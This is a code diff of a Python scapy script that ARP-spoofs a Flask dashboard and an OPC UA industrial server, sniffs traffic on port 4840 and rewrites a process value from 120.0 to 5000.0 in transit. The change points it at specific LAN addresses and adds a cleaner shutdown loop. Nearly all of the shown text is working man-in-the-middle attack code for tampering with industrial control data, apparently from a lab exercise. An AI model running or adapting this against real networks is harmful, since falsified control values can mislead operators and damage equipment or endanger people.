@@ -2,14 +2,21 @@ from scapy.all import *
 import time
 import struct
 import subprocess
+import signal
 
-TARGET_IP = "10.9.0.5"   # Flask Dashboard
-SERVER_IP = "10.9.0.6"   # OPC UA Server
-# Wi-Fi interface name
-INTERFACE = "Intel(R) Wi-Fi 6E AX211 160MHz" 
+INTERFACE = 20  
+SERVER_IP = "10.204.157.171" # <--- Replace with the real Server IPv4
+TARGET_IP = "10.204.157.245" # <--- This is YOUR IP (the Flask Client)
 
 OLD_VAL = 120.0
 NEW_VAL = 5000.0
+
+keep_running = True
+
+def signal_handler(sig, frame):
+    global keep_running
+    print("\n[!] Shutdown signal received...")
+    keep_running = False
 
 def get_mac(ip):
     """Fetch MAC address for ARP spoofing."""
@@ -57,7 +64,10 @@ def manipulate_opcua(pkt):
     if pkt.haslayer(IP) and pkt[IP].dst != get_if_addr(INTERFACE):
         send(pkt, iface=INTERFACE, verbose=False)
 
+signal.signal(signal.SIGINT, signal_handler)
+
 def main():
+    show_interfaces()
     print(f"[*] Starting Data Manipulation on: {INTERFACE}")
     
     # Enable Windows IP Forwarding via PowerShell
@@ -73,8 +83,10 @@ def main():
             spoof_arp(SERVER_IP, TARGET_IP)
             
             # Intercept 5 packets at a time
-            sniff(iface=INTERFACE, prn=manipulate_opcua, filter="tcp port 4840", count=5, store=0)
+            sniff(iface=INTERFACE, prn=manipulate_opcua, filter="tcp port 4840", count=5, timeout=1, store=0, stop_filter=lambda x: not keep_running)
             
+            if not keep_running:
+                break
     except KeyboardInterrupt:
         print("\n[*] Restoring and disabling forwarding...")
         subprocess.run(["powershell", "Set-NetIPInterface -Forwarding Disabled"], shell=True)
